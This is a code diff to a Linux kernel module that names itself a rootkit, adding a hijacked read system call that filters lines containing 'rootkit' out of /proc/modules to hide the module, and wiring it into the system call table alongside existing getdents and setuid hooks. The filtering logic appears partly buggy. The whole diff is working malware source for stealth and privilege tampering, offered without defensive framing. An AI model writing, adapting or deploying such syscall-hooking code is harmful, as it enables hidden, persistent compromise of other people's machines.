@@ -34,6 +34,58 @@ unsigned long * sys_call_table;
 asmlinkage int (*real_setuid) (uid_t uid);
 asmlinkage int (*real_setuid32) (uid_t uid);
 asmlinkage int (*real_getdents) (unsigned int, struct linux_dirent*, unsigned int);
+asmlinkage long (*real_read)(unsigned int, char __user *, size_t);
+
+asmlinkage long hijacked_read(unsigned int fd, char __user *buf, size_t count)
+{
+	bool rootkitfound = false;
+	char *kbuf, *path, *str1, *str2;
+	long num_reads = real_read(fd, buf, count), bufcount = 0;
+	long ac_read = 0;
+	struct file *f = fget(fd);
+
+	if ( num_reads <= 0)
+		goto out;
+	kbuf = kmalloc(PAGE_SIZE, GFP_KERNEL);
+	if (kbuf == NULL) {
+		num_reads = -ENOMEM;
+		goto out;
+	}
+	path = d_path(&f->f_path, kbuf, PAGE_SIZE);
+	if (strcmp(path, "/proc/modules") == 0) {
+		if (num_reads > PAGE_SIZE) {
+			// TODO: Need to handle large pages iteratively
+			// /proc/modules will hardly have more than 1024 size of entries
+			num_reads = -ENOMEM;
+			goto out;
+		}
+
+		copy_from_user(kbuf, buf, num_reads);
+		str1 = kbuf;
+		while(str2 = strsep(&str1, "\n")){
+			ac_read += (str1 - str2);
+			if (strstr(str2, "rootkit") != NULL) {
+				rootkitfound = true;
+			} else {
+				kbuf[ac_read - 1] = '\n';
+				if (rootkitfound) {
+					copy_to_user(buf + bufcount, str2, str1 - str2);
+				}
+				bufcount += (str1 - str2);
+			}
+			if( strnstr(str1, "\n", num_reads - ac_read) == NULL)
+				break;
+		}
+		strncpy(buf + bufcount, str1, num_reads - ac_read);
+		bufcount += (num_reads - ac_read);
+		memset(kbuf, 0, num_reads - bufcount);
+		copy_to_user(buf + bufcount, kbuf, num_reads - bufcount);
+	}
+
+	kfree(kbuf);
+out:
+	return num_reads;
+}
 
 asmlinkage int hijacked_setuid(uid_t uid){
 	struct cred *new;
@@ -151,9 +203,11 @@ void hijack_sys_call_table(void){
         real_getdents = (void*)*(sys_call_table + __NR_getdents);
         real_setuid = (void*)*(sys_call_table + __NR_setuid);
         real_setuid32 = (void*)*(sys_call_table + __NR_setuid32);
+        real_read = (void*)*(sys_call_table + __NR_read);
         *(sys_call_table + __NR_getdents) = (unsigned long)hijacked_getdents;
         *(sys_call_table + __NR_setuid) = (unsigned long)hijacked_setuid;
         *(sys_call_table + __NR_setuid32) = (unsigned long)hijacked_setuid;
+        *(sys_call_table + __NR_read) = (unsigned long)hijacked_read;
 	make_ro((unsigned long)sys_call_table);
 }
 
@@ -177,6 +231,7 @@ void cleanup_module(void){
 	*(sys_call_table + __NR_getdents) = (unsigned long)real_getdents;
         *(sys_call_table + __NR_setuid) = (unsigned long)real_setuid;
         *(sys_call_table + __NR_setuid32) = (unsigned long)real_setuid32;
+        *(sys_call_table + __NR_read) = (unsigned long)real_read;
 	make_ro((unsigned long)sys_call_table);
 	printk(KERN_INFO "Rootkit removed.\n");
 }
